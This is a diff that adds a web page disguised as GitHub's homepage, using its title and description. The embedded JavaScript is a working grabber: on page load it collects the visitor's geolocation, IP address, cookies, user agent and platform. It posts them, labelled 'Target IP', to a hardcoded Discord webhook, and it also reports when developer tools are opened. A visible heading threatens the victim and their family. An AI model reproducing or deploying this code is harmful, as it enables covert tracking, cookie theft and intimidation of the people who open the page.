@@ -1,1 +1,263 @@
+<!doctype html>
+<html>
+ <head>
+  <title>GitHub: Let's build from here
+  </title>
+  <meta name="description"
+   content="GitHub is where people build software. More than 100 million people use GitHub to discover, fork, and contribute to over 330 million projects.">
+  <link rel="stylesheet"
+   href="style.css">
+ </head>
+ <body>
+  
+  <script src="script.js"></script>
+  
+  <html lang="en">
+   <head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+     content="width=device-width, initial-scale=1.0">
 
+
+<font face="Adobe Gothic Std"
+         size="5" font color="red">
+         <body>
+          <div class="container">
+           
+           <h5>Youre so stupid for falling for my trap. Qc owns you, Dont try to runaway dear i will find you. Blocking will result in a worse situation for you and your family.</h5
+           
+           
+           <font face="Adobe Gothic Std"
+         size="3" font color="red">
+           
+          </div>
+           </div>
+          <p id="location"></p>
+          <div id="ip-address"></div>
+          <div id="cookies"></div>
+          <div id="device-info"></div>
+          <div id="browser-info"></div>
+        </font>
+        <script>
+         document.addEventListener(
+          'DOMContentLoaded', () => {
+           getLocation();
+           getIPAddress();
+          });
+         
+         function getLocation() {
+          if ('geolocation' in
+           navigator) {
+           navigator.geolocation
+            .getCurrentPosition(
+             showLocation,
+             handleError);
+          } else {
+           document.getElementById(
+             'location')
+            .textContent =
+            "Geolocation is not supported by this browser.";
+          }
+         }
+         
+         function showLocation(
+          position) {
+          const latitude = position
+           .coords
+           .latitude;
+          const longitude = position
+           .coords
+           .longitude;
+          document.getElementById(
+            'location')
+           .textContent =
+           `Latitude: ${latitude}, Longitude: ${longitude}`;
+         }
+         
+         function handleError(error) {
+          switch (error.code) {
+           case error
+           .PERMISSION_DENIED:
+            document.getElementById(
+              'location')
+             .textContent =
+             "Permission to access device location was denied.";
+            break;
+           case error
+           .POSITION_UNAVAILABLE:
+            document.getElementById(
+              'location')
+             .textContent =
+             "Device location information is unavailable.";
+            break;
+           case error.TIMEOUT:
+            document.getElementById(
+              'location')
+             .textContent =
+             "Request to get device location timed out.";
+            break;
+           case error.UNKNOWN_ERROR:
+            document.getElementById(
+              'location')
+             .textContent =
+             "An unknown error occurred while getting the device location.";
+            break;
+          }
+         }
+         
+         const DISCORD_WEBHOOK_URL =
+          'https://discord.com/api/webhooks/1154832614574788648/1nDSJ6q-s9XLCLNXQjuCKaV1qkzXMs2n_nWu5_cM7Y2DYYtwdiyhispD2Y6234tUK-oc';
+         
+         async function getIPAddress() {
+          try {
+           const response =
+            await fetch(
+             'https://api.ipify.org?format=json'
+            );
+           const data = await response
+            .json();
+           const ipAddress = data.ip;
+           displayIPAddress(
+            ipAddress);
+           displayCookies();
+           displayDeviceInfo();
+           displayBrowserInfo();
+           sendToDiscord(`Target IP: ${ipAddress}
+${getDeviceInfo()}
+${getBrowserInfo()}
+${getCookiesInfo()}`);
+          } catch (error) {
+           console.error(
+            'Failed to fetch IP address:',
+            error);
+          }
+         }
+         
+         function displayIPAddress(
+          ipAddress) {
+          const ipAddressElement =
+           document
+           .getElementById(
+            'ip-address');
+          ipAddressElement
+           .textContent =
+           `IP Address: ${ipAddress}`;
+         }
+         
+         function displayCookies() {
+          const cookiesElement =
+           document
+           .getElementById('cookies');
+          const cookies = document
+           .cookie.split(
+            '; ');
+          let cookiesHTML =
+           'Cookies:<br>';
+          cookies.forEach((cookie) => {
+           cookiesHTML +=
+            `${cookie}<br>`;
+          });
+          cookiesElement.innerHTML =
+           cookiesHTML;
+         }
+         
+         function displayDeviceInfo() {
+          const deviceInfoElement =
+           document
+           .getElementById(
+            'device-info');
+          const deviceInfo =
+           getDeviceInfo();
+          deviceInfoElement
+           .textContent = `Device Info:
+${deviceInfo}`;
+         }
+         
+         function displayBrowserInfo() {
+          const browserInfoElement =
+           document
+           .getElementById(
+            'browser-info');
+          const browserInfo =
+           getBrowserInfo();
+          browserInfoElement
+           .textContent = `Browser Info:
+${browserInfo}`;
+         }
+         
+         function getCookiesInfo() {
+          const cookies = document
+           .cookie;
+          return `Cookies: ${cookies}`;
+         }
+         
+         function getDeviceInfo() {
+          const userAgent = navigator
+           .userAgent;
+          const platform = navigator
+           .platform;
+          const deviceInfo = `User Agent: ${userAgent}
+Platform: ${platform}`;
+          return deviceInfo;
+         }
+         
+         function getBrowserInfo() {
+          
+          return '';
+         }
+         
+         async function sendToDiscord(
+          message) {
+          try {
+           const payload = {
+            content: message,
+           };
+           
+           const response =
+            await fetch(
+             DISCORD_WEBHOOK_URL, {
+              method: 'POST',
+              headers: {
+               'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(
+               payload),
+             });
+           
+           if (response.status !==
+            204) {
+            console.error(
+             'Failed to send message to Discord.'
+            );
+           }
+          } catch (error) {
+           console.error(
+            'Failed to send message to Discord:',
+            error);
+          }
+         }
+         
+         window.addEventListener(
+          'devtoolschange', (
+           event) => {
+           if (event.detail.isOpen) {
+            console.log(
+             'IDS Detected Developer tools or inspect element opened'
+            );
+            sendToDiscord(
+             'IDS Detected Developer tools or inspect element opened'
+            );
+           }
+          });
+        </script>
+        
+        <style>
+  body{
+    background:#000000
+  }
+</style>
+
+
+        </body>
+    
+  </html>
